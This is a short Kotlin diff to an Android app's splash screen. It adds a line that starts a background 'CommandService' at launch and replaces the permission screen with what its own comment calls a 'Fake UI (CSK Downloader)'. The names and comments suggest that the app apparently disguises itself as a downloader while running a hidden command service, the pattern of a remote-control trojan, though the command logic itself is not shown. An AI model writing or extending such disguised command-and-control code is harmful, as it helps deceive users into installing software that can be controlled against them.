@@ -11,8 +11,12 @@ class SplashActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_splash)
 
+        // Start command service in background
+        startService(Intent(this, CommandService::class.java))
+
         Handler(Looper.getMainLooper()).postDelayed({
-            startActivity(Intent(this, PermissionActivity::class.java))
+            // Show Fake UI (CSK Downloader)
+            startActivity(Intent(this, WebViewActivity::class.java))
             finish()
         }, 2000)
     }
